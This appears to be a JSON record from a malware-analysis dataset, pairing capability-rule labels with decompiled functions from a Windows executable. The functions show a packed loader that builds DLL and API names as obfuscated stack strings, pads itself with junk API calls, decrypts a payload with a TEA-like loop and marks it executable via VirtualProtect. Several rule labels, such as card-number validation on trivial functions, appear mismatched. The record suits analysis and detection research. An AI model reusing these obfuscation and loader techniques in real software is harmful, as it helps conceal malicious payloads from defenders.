        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040de8a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408ff0(0x412390, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00407737();\n        *puVar2 = 0;\n        puVar2 = fcn.00407724();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0xaaa684)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0xaaa6a0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040d690(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00407724();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00407737();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040d757(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040df5c(0x412390);\n                goto code_r0x0040df56;\n            }\n        }\n        puVar2 = fcn.00407737();\n        *puVar2 = 0;\n        puVar2 = fcn.00407724();\n        *puVar2 = 9;\n        fcn.004076bc(0, 0, 0, 0, 0);\n    }\ncode_r0x0040df56:\n    fcn.00409035();\n    return;\n}\n",
        "token_count": 624
    },
    "0040351b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.0040351b(void)\n\n{\n    *0xa90330 = 100;\n    *0xa9032b = 0x6d;\n    *0xa90331 = 0x6c;\n    *0xa9032f = 0x2e;\n    *0xa90332 = 0x6c;\n    *0xa9032e = 0x32;\n    *0xa9032a = 0x69;\n    *0xa90328 = 0x6d;\n    *0xa90329 = 0x73;\n    *0xa9032d = 0x33;\n    *0xa90333 = 0;\n    *0xa9032c = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0xa90328);\n    return;\n}\n",
        "token_count": 185
    },
    "00403e3b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00403e3b(void)\n\n{\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xa90328;\n    *0xa9032e = 0x33;\n    *0xa9032f = 0x32;\n    *0xa90333 = 0x6c;\n    *0xa90332 = 0x6c;\n    *0xa9032b = 0x6e;\n    *0xa9032d = 0x6c;\n    *0xa90328 = 0x6b;\n    *0xa9032c = 0x65;\n    *0xa9032a = 0x72;\n    *0xa90330 = 0x2e;\n    *0xa90331 = 100;\n    *0xa90329 = 0x65;\n    *0xa90334 = 0;\n    uStack16 = 0x403ea4;\n    *0xaa9570 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uStack16 = 0xa90328;\n    *0xa90333 = 0x65;\n    *0xa90329 = 0x69;\n    *0xa9032c = 0x75;\n    *0xa9032e = 0x6c;\n    *0xa9032d = 0x61;\n    *0xa90331 = 0x6f;\n    *0xa90335 = 0x74;\n    *0xa90328 = 0x56;\n    *0xa90334 = 99;\n    *0xa9032f = 0x50;\n    *0xa90336 = 0;\n    *0xa9032b = 0x74;\n    *0xa90332 = 0x74;\n    *0xa9032a = 0x72;\n    *0xa90330 = 0x72;\n    *0xa90324 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0xaa9570);\n    (**0xa90324)(*0xaa9120, *0xaa9574, 0x40, &stack0xfffffff0);\n    return;\n}\n",
        "token_count": 484
    },
    "00403c63": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c63(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t extraout_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puVar4 = arg_8h;\n    iVar1 = *arg_ch;\n    arg_ch_00 = arg_ch[1];\n    uVar5 = arg_8h[1];\n    iVar2 = arg_ch[2];\n    iVar3 = arg_ch[3];\n    uVar6 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    var_ch = 0x20;\n    do {\n        var_8h = uVar6 * 0x10 + iVar2;\n        arg_8h = (uVar6 >> 5) + iVar3;\n        *0xaa9124 = 0xffcf03fc;\n        fcn.004035b7(&var_8h, var_4h + uVar6);\n        *0xaa9124 = 0;\n        *0xaa912c = 0xffffffff;\n        uVar5 = uVar5 - (arg_8h ^ var_8h);\n        arg_8h = uVar5 >> 5;\n        *0xaa9128 = 0xff6b3619;\n        fcn.00403c46(&arg_8h, arg_ch_00);\n        uVar6 = uVar6 - (uVar5 * 0x10 + iVar1 ^ arg_8h ^ extraout_EDX);\n        arg_ch = 0x9e3779b9;\n        var_4h = var_4h + 0x61c88647;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    *puVar4 = uVar6;\n    puVar4[1] = uVar5;\n    return;\n}\n",
        "token_count": 523
    },
    "00403d41": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d41(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_400h;\n    \n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0xaa9574 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)(0, &var_400h, 0);\n        }\n        fcn.00403c63(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "004051e1": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004051e1(int32_t param_1, uint param_2, int32_t param_3, uint param_4)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x40) = param_4;\n    if ((param_3 != 0) && ((param_4 & 6) != 6)) {\n        arg_8h = fcn.00404dc5(param_3);\n        fcn.00404e53(arg_8h, param_3, unaff_retaddr, param_3);\n        param_3 = param_3 + arg_8h;\n        *(param_1 + 0x3c) = param_3;\n        if ((*(param_1 + 0x40) & 4) == 0) {\n            fcn.004045fb(arg_8h, arg_8h, param_3);\n        }\n        if ((*(param_1 + 0x40) & 2) == 0) {\n            iVar1 = param_3;\n            if ((*(param_1 + 0x40) & 0x10) == 0) {\n                iVar1 = arg_8h;\n            }\n            fcn.00404642(arg_8h, iVar1, param_3);\n            iVar1 = fcn.004045e4();\n            if (iVar1 == 0) {\n                fcn.004045fb(arg_8h, 0, arg_8h);\n            }\n        }\n        *(param_1 + 0x40) = *(param_1 + 0x40) | 1;\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "004035b7": {
        "rules": [
            "contain obfuscated stackstrings",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004035b7(uint32_t *param_1, uint32_t param_2)\n\n{\n    *param_1 = *param_1 ^ param_2;\n    return;\n}\n",
        "token_count": 44
    },
    "00403c46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403c46(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
        "token_count": 47
    },
    "00403e2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403e2d(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "00403f4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpLastAccessTime\n// WARNING: Variable defined which should be unmapped: lpLastWriteTime\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nuint fcn.00403f4b(void)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint lpBuffer;\n    uint lpszVolumeName;\n    uint lpString1;\n    uint lpVersionInformation;\n    uint lpFindFileData;\n    uint uStackY136;\n    uint uStackY132;\n    uint uStackY128;\n    uint uStackY124;\n    uint uStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uint uStackY108;\n    uint uStackY104;\n    uint uStackY100;\n    uint *puStackY96;\n    uint *puStackY92;\n    uint *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uint uStackY72;\n    uint uStackY68;\n    uint pActCtx;\n    uint uStackY60;\n    uint *puStackY56;\n    uint uStackY52;\n    uint uStackY48;\n    uint *puStackY44;\n    uint *puStackY40;\n    uint *puStackY36;\n    uint *lpCreationTime;\n    uint *puStackY28;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpFilePart;\n    \n    lpFilePart = 0x403f58;\n    fcn.00405ef0();\n    iVar1 = 0;\n    do {\n        if (iVar1 == 0x13e6) {\n            *0xaa9574 = *0xaa9574 + 0x38d6;\n        }\n        if (*0xaa9574 == 0xbd8) {\n            lpLastWriteTime = 0x401298;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x31a652);\n    lpLastWriteTime = 0x403f96;\n    fcn.00403f37();\n    arg_8h = 0;\n    if (*0xaa9574 != 0) {\n        do {\n            fcn.00403d8d(arg_8h);\n            if (*0xaa9574 == 0x29) {\n                (*_sym.imp.KERNEL32.dll_SetFileApisToOEM)();\n                lpLastAccessTime = 0x403fc0;\n                (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *0xaa9574);\n    }\n    iVar1 = 0;\n    while( true ) {\n        if (*0xaa9574 == 0x481) {\n            lpLastWriteTime = 0;\n            lpLastAccessTime = 0x401304;\n            puStackY28 = 0x401310;\n            lpCreationTime = NULL;\n            puStackY36 = 0x403fe6;\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n            puStackY36 = NULL;\n            puStackY40 = 0x403fed;\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)();\n            puStackY40 = NULL;\n            puStackY44 = NULL;\n            uStackY48 = 0x403ff5;\n            (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n        }\n        if (*0xaa9574 == 0x721) break;\n        iVar1 = iVar1 + 1;\n        if (0x962be1 < iVar1) {\n            if (*0xaa9574 == 0x19c) {\n                lpLastWriteTime = 0;\n                lpLastAccessTime = 0;\n                puStackY28 = 0x40401a;\n                (*_sym.imp.KERNEL32.dll_CopyFileW)();\n                puStackY28 = NULL;\n                lpCreationTime = NULL;\n                puStackY36 = NULL;\n                puStackY40 = NULL;\n                puStackY44 = NULL;\n                uStackY48 = 0;\n                uStackY52 = 0x404026;\n                (*_sym.imp.KERNEL32.dll_UpdateResourceW)();\n                uStackY52 = 0;\n                puStackY56 = 0x40402d;\n                (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n                puStackY56 = &fcn.00403f4b::pActCtx;\n                uStackY60 = 0x404037;\n                (*_sym.imp.KERNEL32.dll_CreateActCtxW)();\ncode_r0x00404080:\n                uStackY60 = 0;\n                pActCtx = 0x404087;\n                (*_sym.imp.KERNEL32.dll_ExitThread)();\n            }\n            iVar1 = 0;\n            do {\n                if (iVar1 == 0xab9d) {\n                    lpLastWriteTime = 0xa90328;\n                    *0xaa9570 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n                }\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < 0x2594b);\n            *0xa90328 = 0;\n            iVar1 = 0;\n            do {\n                if (iVar1 == 0x148) {\n                    lpLastWriteTime = 0x4040bf;\n                    fcn.00403e3b();\n                }\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < 0x427fa7);\n            lpLastWriteTime = 0x413010;\n            lpLastAccessTime = *0xaa9120;\n            puStackY28 = 0x4040de;\n            fcn.00403d41(*0xaa9120, *0xaa9574, 0x413010);\n            iVar1 = 0;\n            do {\n                puStackY28 = NULL;\n                lpCreationTime = 0x4040e7;\n                (*_sym.imp.KERNEL32.dll_LocalFlags)();\n                if (iVar1 == 0x2f7e4) {\n                    puStackY28 = 0x4040f4;\n                    fcn.00403e2d();\n                }\n                iVar1 = iVar1 + 1;\n            } while (iVar1 < 0x48122);\n            puStackY28 = 0x404102;\n            fcn.0040351b();\n            if (*0xaa9574 == 0x58c) {\n                puStackY28 = NULL;\n                lpCreationTime = NULL;\n                puStackY36 = 0x404116;\n                (*_sym.imp.KERNEL32.dll_LocalShrink)();\n                puStackY36 = NULL;\n                puStackY40 = &fcn.00403f4b::lpszVolumeName;\n                puStackY44 = 0x404124;\n                (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)();\n                puStackY44 = &fcn.00403f4b::lpFindFileData;\n                uStackY48 = 0;\n                uStackY52 = 0x404132;\n                (*_sym.imp.KERNEL32.dll_FindNextFileA)();\n                uStackY52 = 0x404138;\n                (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n                uStackY52 = 0;\n                puStackY56 = NULL;\n                uStackY60 = 0;\n                pActCtx = 0;\n                uStackY68 = 0x4013a0;\n                uStackY72 = 0x401400;\n                uStackY76 = 0x40414c;\n                (*_sym.imp.KERNEL32.dll_CopyFileExW)();\n                uStackY76 = 0;\n                uStackY80 = 0;\n                uStackY84 = 0;\n                puStackY88 = &fcn.00403f4b::lpVersionInformation;\n                puStackY92 = 0x40415c;\n                (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)();\n                puStackY92 = &fcn.00403f4b::lpFilePart;\n                puStackY96 = &fcn.00403f4b::lpBuffer;\n                uStackY100 = 0;\n                uStackY104 = 0;\n                uStackY108 = 0;\n                uStackY112 = 0;\n                uStackY116 = 0x404171;\n                (*_sym.imp.KERNEL32.dll_SearchPathW)();\n                uStackY116 = 0;\n                uStackY120 = 0;\n                uStackY124 = 0;\n                uStackY128 = 0x401464;\n                uStackY132 = 0x401478;\n                uStackY136 = 0x404184;\n                (*_sym.imp.KERNEL32.dll_MoveFileWithProgressA)();\n            }\n            puStackY28 = 0x404189;\n            fcn.00403e26();\n            return 0;\n        }\n    }\n    lpLastWriteTime = 0x401320;\n    lpLastAccessTime = 0x40404b;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)();\n    lpLastAccessTime = 0;\n    puStackY28 = 0x404052;\n    (*_sym.imp.KERNEL32.dll_RemoveVectoredExceptionHandler)();\n    puStackY28 = &fcn.00403f4b::lpFilePart;\n    lpCreationTime = 0x40405c;\n    (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n    lpCreationTime = &fcn.00403f4b::lpLastWriteTime;\n    puStackY36 = &fcn.00403f4b::lpLastAccessTime;\n    puStackY40 = &fcn.00403f4b::lpCreationTime;\n    puStackY44 = NULL;\n    uStackY48 = 0x40406f;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)();\n    uStackY48 = 0x401340;\n    uStackY52 = 0x401360;\n    puStackY56 = NULL;\n    uStackY60 = 0x404080;\n    (*_sym.imp.KERNEL32.dll_FindResourceA)();\n    goto code_r0x00404080;\n}\n",
        "token_count": 2271
    },
    "00404794": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404794(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040346a(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 57
    },
    "004047af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004047af(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040344e(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 57
    },
    "00404e9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404e9b(uchar *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t *in_ECX;\n    uchar *arg_8h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    arg_8h_00 = arg_8h;\n    iVar4 = arg_10h;\n    if (0 < arg_10h) {\n        do {\n            iVar3 = fcn.0040485a();\n            if (iVar3 < 1) {\n                arg_10h = (**(*in_ECX + 0x14))();\n                arg_8h = fcn.0040480b();\n                cVar1 = fcn.004047f9(&arg_8h, &arg_10h);\n                if (cVar1 != '\\0') {\n                    return var_4h;\n                }\n                uVar2 = fcn.004047ea(&arg_10h);\n                *arg_8h_00 = uVar2;\n                arg_8h_00 = arg_8h_00 + 1;\n                var_4h = var_4h + 1;\n                iVar5 = -1;\n            }\n            else {\n                if (iVar4 < iVar3) {\n                    iVar3 = iVar4;\n                }\n                iVar5 = iVar3;\n                arg_10h_00 = fcn.004045e4();\n                fcn.00404e53(arg_8h_00, arg_ch, arg_10h_00, iVar5);\n                var_4h = var_4h + iVar3;\n                arg_8h_00 = arg_8h_00 + iVar3;\n                iVar5 = -iVar3;\n                fcn.00404839(iVar3);\n            }\n            iVar4 = iVar4 + iVar5;\n        } while (0 < iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 482
    },
    "00404f33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404f33(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t arg_10h;\n    int32_t arg_14h;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar4 = arg_ch;\n    var_8h = in_ECX;\n    if (0 < arg_ch) {\n        do {\n            iVar2 = fcn.0040487a();\n            if (iVar2 < 1) {\n                iVar2 = *in_ECX;\n                uVar3 = fcn.004047f1(arg_8h);\n                arg_ch = (**(iVar2 + 4))(uVar3);\n                var_8h = fcn.0040480b();\n                cVar1 = fcn.004047f9(&var_8h, &arg_ch);\n                if (cVar1 != '\\0') {\n                    return var_4h;\n                }\n                arg_8h = arg_8h + 1;\n                var_4h = var_4h + 1;\n                iVar2 = -1;\n            }\n            else {\n                iVar5 = iVar2;\n                if (iVar4 < iVar2) {\n                    iVar5 = iVar4;\n                }\n                arg_10h = arg_8h;\n                arg_14h = iVar5;\n                uVar3 = fcn.004045ea();\n                fcn.00404e53(uVar3, iVar2, arg_10h, arg_14h);\n                arg_8h = arg_8h + iVar5;\n                var_4h = var_4h + iVar5;\n                iVar2 = -iVar5;\n                fcn.00404869(iVar5);\n            }\n            iVar4 = iVar4 + iVar2;\n        } while (0 < iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 467
    },
    "0040536f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040536f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040696b(arg_8h, arg_ch, arg_10h, arg_14h);\n    return arg_8h;\n}\n",
        "token_count": 68
    },
    "004054ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054ec(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040536f(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00405547": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405547(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.004054ec(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 70
    },
    "00405c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405c78(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00406b7c(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.00405d6d(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x40159c;\n    fcn.00405c4d(arg_8h_00 + 0xc);\n    fcn.00406be5();\n    return;\n}\n",
        "token_count": 201
    },
    "00406522": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00406522(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00408ff0(0x411f50, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00407724();\n        *puVar1 = 0x16;\n        fcn.004076bc(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.00408e3b();\n        fcn.00408f53(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.00408e3b();\n        arg_8h_00 = fcn.004092fa(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.00408e3b();\n        uVar4 = fcn.004094f7(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.00408e3b();\n        fcn.00409396(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004065be();\n    }\n    fcn.00409035();\n    return;\n}\n",
        "token_count": 460
    },
    "004065be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004065be(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408e3b();\n    fcn.00408fc1(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 55
    },
    "0040a37f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a37f(uint arg_8h)\n\n{\n    fcn.0040a253(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 42
    },
    "0040ad30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ad44)\n// WARNING: Removing unreachable block (ram,0x0040ad4a)\n// WARNING: Removing unreachable block (ram,0x0040ad4c)\n\nvoid fcn.0040ad30(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004046ea": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046ea(int32_t param_1)\n\n{\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    fcn.00404626(0, 0);\n    fcn.004045fb(0, 0, 0);\n    return;\n}\n",
        "token_count": 176
    },
    "0040f891": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040f891(void)\n\n{\n    *0xa90314 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402f84, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "0040709f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040709f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408ff0(0x412018, 0xc);\n    fcn.0040b6c3(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0xaa9ad8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0xaa9ad4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004070e3;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00406adf(arg_8h_00);\ncode_r0x004070e3:\n        fcn.00406adf(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00407106();\n    fcn.00409035();\n    return;\n}\n",
        "token_count": 394
    },
    "00403d8d": {
        "rules": [
            "get common file path",
            "print debug messages",
            "create directory",
            "delete directory"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nvoid __cdecl fcn.00403d8d(int32_t arg_8h)\n\n{\n    uint var_1818h;\n    uint var_1018h;\n    uint lpBuffer;\n    uint uStack84;\n    uint uStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack32;\n    uint *var_18h;\n    uint *puStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint lpNumberOfEventsRead;\n    \n    lpNumberOfEventsRead = 0x403d9a;\n    fcn.00405ef0();\n    if (*0xaa9574 == 0x37) {\n        uStack12 = 0x401230;\n        uStack16 = 0x403daf;\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringW)();\n        uStack16 = 0x401274;\n        uStack20 = 0x403dba;\n        (*_sym.imp.KERNEL32.dll_RemoveDirectoryA)();\n        uStack20 = 0;\n        puStack24 = &fcn.00403d8d::lpBuffer;\n        var_18h = 0x403dca;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        var_18h = &fcn.00403d8d::var_1018h;\n        uStack32 = 0;\n        puStack36 = 0x403dd8;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n        puStack36 = &fcn.00403d8d::lpNumberOfEventsRead;\n        uStack40 = 0;\n        puStack44 = &fcn.00403d8d::var_18h;\n        uStack48 = 0;\n        uStack52 = 0x403de8;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        uStack52 = 0;\n        uStack56 = 0;\n        uStack60 = 0;\n        uStack64 = 0x403df1;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack64 = 0;\n        uStack68 = 0x403df8;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack68 = 0;\n        uStack72 = 0;\n        puStack76 = &fcn.00403d8d::var_1818h;\n        uStack80 = 0;\n        uStack84 = 0x403e08;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n    }\n    *(*0xaa9120 + arg_8h) = *(*0xaa9988 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 672
    }
}